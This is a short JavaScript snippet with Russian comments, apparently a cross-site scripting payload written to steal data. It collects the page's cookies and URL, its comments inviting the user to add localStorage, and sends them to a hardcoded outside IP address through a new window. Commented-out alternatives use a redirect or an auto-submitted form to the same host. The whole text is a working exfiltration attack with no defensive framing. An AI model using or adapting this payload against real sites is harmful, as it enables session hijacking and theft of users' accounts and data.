(() => {
  // Собираем все данные, которые хочешь украсть
  let data = {
    cookie: document.cookie,
    href: location.href,
    // Если нужно, можно добавить и другие данные
    // localStorage: {...localStorage}
  };
  
  const payload = encodeURIComponent(JSON.stringify(data));
  
  // Вариант А: Редирект (сработает 100%)
  // window.location = `http://45.82.82.114:9055/collect?d=${payload}`;
  
  // Вариант Б: Открыть в новом окне (не трогает текущую страницу)
  window.open(`http://45.82.82.114:8081/collect?d=${payload}`);
  
  // Вариант В: Попытаться отправить через форму (тоже разрешено)
  // const f = document.createElement('form');
  // f.method = 'GET';
  // f.action = 'http://45.82.82.114:8081/collect';
  // f.innerHTML = `<input name="d" value='${payload}'>`;
  // document.body.appendChild(f);
  // f.submit();
})();
